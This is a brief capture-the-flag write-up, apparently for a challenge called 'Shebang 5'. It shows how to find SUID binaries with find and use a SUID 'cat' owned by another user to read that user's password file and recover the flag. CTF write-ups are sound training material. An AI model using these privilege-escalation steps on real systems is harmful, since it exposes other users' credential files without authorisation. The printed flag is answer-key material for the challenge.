# Shebang 5

## Task

## Solution

We need to find a bad file. A SUID binary for example.

```bash
$ find / -perm -4000
...
/var/cat
...
$ ls -lah /var/cat
---s--x--x 1 shebang6 root 17K Oct 14 20:51 /var/cat
```

Hmm, that seems suspicious. Let's find files owned by that user:

```bash
$ find / -user shebang6 2>/dev/null
/var/cat
/etc/passwords/shebang6
$ /var/cat /etc/passwords/shebang6
CYCTF{W3ll_1_gu3$$_SU1D_1$_e@$y_fl@g$}
```
